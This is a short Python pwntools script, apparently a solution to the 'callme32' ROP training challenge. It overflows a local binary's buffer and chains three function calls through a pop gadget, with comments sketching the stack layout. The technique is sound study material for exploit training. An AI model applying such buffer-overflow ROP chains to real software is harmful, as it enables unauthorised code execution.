from pwn import *

overflow_size = 0x4 + 0x28
pop_gadget_addr = 0x080488a9
call_one_addr = 0x080485c0
call_two_addr = 0x08048620
call_three_addr=0x080485b0

# &call_one
# &gadget
# 1
# 2
# 3
# &call_two
# &gadget
# 1,2,3
# &call_three
# 'BBBB'
# 1,2,3

p = process('./callme32')
# gdb.attach(p)
p.sendline(overflow_size * 'A' +
        p32(call_one_addr) +
        p32(pop_gadget_addr) +
        p32(1) + p32(2) + p32(3) +
        p32(call_two_addr) +
        p32(pop_gadget_addr) +
        p32(1) + p32(2) + p32(3) +
        p32(call_three_addr) +
        'BBBB' +
        p32(1) + p32(2) + p32(3))

p.interactive()



# p.sendline(overflow_size * 'A' + p32(call_one_addr) + p32(call_two_addr) + 'BBBB' + p32(1) + p32(2) + p32(3))
# raw_input()
